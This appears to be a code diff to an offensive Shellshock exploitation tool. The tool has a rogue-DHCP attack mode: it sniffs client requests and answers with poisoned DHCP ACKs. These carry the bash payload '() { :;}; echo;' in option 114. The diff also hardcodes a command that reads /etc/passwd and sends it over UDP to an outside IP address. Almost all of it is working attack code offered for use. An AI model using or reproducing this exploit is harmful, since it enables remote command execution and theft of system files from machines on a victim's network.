@@ -339,7 +339,7 @@ DHCP_PARAMETERS = {
 
 # List of attack strings
 ATTACKS = [
-   "() { %3a;}; echo; "
+        "() { :;}; echo;"
    ]
 
 # Timeout for attacks which do no provide an interactive response
@@ -688,14 +688,14 @@ def print_progress(
 # DHCP Attacks
 #
 ###################
-def do_dhcp_attack():
+def do_dhcp_attack(command):
     """ The main funtion for DHCP attacks. Accepts arguments passed in from the
     command line and outputs to the command line.
     """
     look_for_dhcp_servers()
     while True:
-        dhcp_request = wait_for_dhcp_client_request()
-        poison_dhcp_client(dhcp_request)
+        print "[+] Waiting for DHCP requests..."
+        sniff(filter="udp and (port 67 or port 68)", prn=process_dhcp)
 
 
 def look_for_dhcp_servers():
@@ -751,28 +751,22 @@ def look_for_dhcp_servers():
     else: print "[I] None found - shocker is DHCP authority"
 
 
-def wait_for_dhcp_client_request():
-    print "[+] Waiting for DHCP requests..."
-    sniff(filter="udp and (port 67 or port 68)", prn=process_dhcp)
-
-
 def process_dhcp(pkt):
     if pkt.haslayer('DHCP'):
         options = get_dhcp_options(pkt)
         request_type = DHCP_REQUEST_TYPE[options['message-type']] 
-        requested_paramaters = {}
+        requested_params = {}
         print request_type 
         print "DHCP options: %s" % str(options)
         if options.has_key('param_req_list'):
-            requested_parameters = get_param_req_dict(options['param_req_list'])
-            print "Parameters requested: %s" % str(requested_parameters).strip('[]')
+            requested_params = get_param_req_dict(options['param_req_list'])
+            print "Parameters requested: %s" % str(requested_params).strip('[]')
         print "Command: %s" % str(pkt.command())
         if request_type == "DHCPDISCOVER" or \
                 request_type == "DHCPREQUEST" or \
                 request_type == "DHCPINFORM":
             print "[+] Recieved DHCPREQUEST from %s/%s. Sending ACK..." % (pkt[Ether].src, pkt[IP].src)
-            poison_dhcp_client(pkt, request_type, requested_parameters) 
-        print "-----------------------------------"
+            poison_dhcp_client(pkt, request_type, requested_params) 
 
 
 def get_dhcp_options(pkt):
@@ -801,9 +795,11 @@ def get_param_req_dict(param_req_list):
     return parameter_dictionary
     
 
-def poison_dhcp_client(pkt, request_type, requested_parameters):
+def poison_dhcp_client(pkt, request_type, requested_params):
     """Send poisoned response to the client
     """
+    command = "/bin/cat /etc/passwd>/dev/udp/57.57.57.57/5757"
+    print "DEBUG Here in poinson" 
     if request_type == "DHCPDISCOVER":
         print "DEBUG: Sending DISCOVER response"
         print "pkt[Ether].src = %s" % str(pkt[Ether].src)
@@ -826,7 +822,7 @@ def poison_dhcp_client(pkt, request_type, requested_parameters):
                     ('name_server', '10.10.10.1'), 
                     ('domain', 'localdomain'), 
                     ('broadcast_address', '10.10.10.255'), 
-                    (114, 'TEST' + ATTACKS[0] + ';touch /tmp/me'),
+                    (114, ATTACKS[0] + command),
                     'end', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad'
                     ]
                 )
@@ -857,7 +853,7 @@ def poison_dhcp_client(pkt, request_type, requested_parameters):
                     ('name_server', '10.10.10.1'), 
                     ('domain', 'localdomain'), 
                     ('broadcast_address', '10.10.10.255'), 
-                    (114, 'TEST' + ATTACKS[0] + ';touch /tmp/me'),
+                    (114, ATTACKS[0] + command),
                     'end', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad'
                     ]
                 )
@@ -971,9 +967,10 @@ def main():
     args = parser.parse_args()
 
     # Assign options to variables
+    command = args.command
     if args.Mode == "dhcp":
         print "[+] DHCP ATTACK MODE SELECTED"
-        do_dhcp_attack()
+        do_dhcp_attack(command)
     elif args.Mode == "http":
         print "[+] HTTP ATTACK MODE SELECTED"
         if args.Hostname:
@@ -993,7 +990,6 @@ def main():
         else:
             proxy = ""
         verbose = args.verbose
-        command = args.command
         if args.ssl == True or port == "443":
             protocol = "https"
         else:
